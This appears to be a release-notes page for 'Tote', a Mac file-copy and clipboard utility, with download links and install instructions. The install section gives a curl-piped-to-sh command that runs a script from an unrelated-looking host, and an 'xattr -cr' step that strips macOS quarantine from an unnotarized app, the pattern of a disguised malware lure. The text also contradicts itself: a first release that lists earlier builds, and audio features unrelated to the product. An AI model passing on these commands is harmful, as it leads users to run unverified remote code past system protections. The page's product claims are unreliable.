# Tote release notes

Newest first. Downloads: https://github.com/JKS-sys/tote-07-nov-2026-releases/releases/latest · https://ipconfig.co.network/tote

## Tote 1.0.0 — 07 Nov 2026

- First release of Tote: a copy queue (copy, move, download, folders-only, dates-only, verify, make and check checksum files) that runs one task after another with verification by many checksums, pause and resume that survive a restart, retries, waiting for a drive or share to come back, conflict answers with "every time", several destinations and up to 16 threads (Pro), an editable file list (Pro), scheduling, a speed graph, history, logs and HTML / CSV reports (Pro) — and a clipboard memory with search, pins in your own order, collections that fill themselves, text read out of images, notes, a JSON viewer, a paste sequence, plain-text paste, Shortcuts / AppleScript / Automator actions, private mode, app exclusions, wipe on lock and encrypted backups (Pro); a menu-bar popover on ⌃⇧V, Finder services, accounts, activation codes, Razorpay, the Owner Panel, crash reports, a self-updater, sounds with scenes, light and dark gold themes.

### Install

Tote is a Mac app (Apple silicon — M1 and later). One download: `Tote_<version>_aarch64.dmg`.

- **With Pour:** `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask tote`
- **By hand:** open the DMG and drag Tote into Applications. First launch: `xattr -cr /Applications/Tote.app` (Tote is self-signed, not notarized).
- Per-app volume and the equaliser need macOS 14.4 or later.
- Earlier Windows, Linux, ChromeOS, FreeBSD and Intel Mac builds stay on the releases page but are no longer updated.
